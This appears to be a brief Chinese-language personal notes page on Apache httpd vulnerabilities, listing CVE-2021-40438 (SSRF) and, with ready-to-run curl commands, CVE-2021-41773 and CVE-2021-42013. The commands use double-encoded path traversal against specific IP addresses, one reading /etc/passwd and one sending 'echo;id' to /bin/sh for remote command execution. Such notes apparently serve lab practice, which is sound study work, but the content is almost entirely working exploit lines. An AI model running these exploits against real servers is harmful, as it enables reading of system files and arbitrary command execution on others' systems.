---
title: "Apache"
date: 2026-01-30
updated: 2026-01-30
tags:
  - Others
categories:
  - Others
description: None
---
## CVE-2021-40438

SSRF

版本：2.4.48

## CVE-2021-41773

路径穿越

2.4.49

```bash
curl -v --path-as-is http://123.58.224.8:57468/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
# 双重编码绕过
```

## CVE-2021-42013

路径穿越

2.4.50

```bash
curl -v --data "echo;id" 'http://123.58.224.8:25878/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```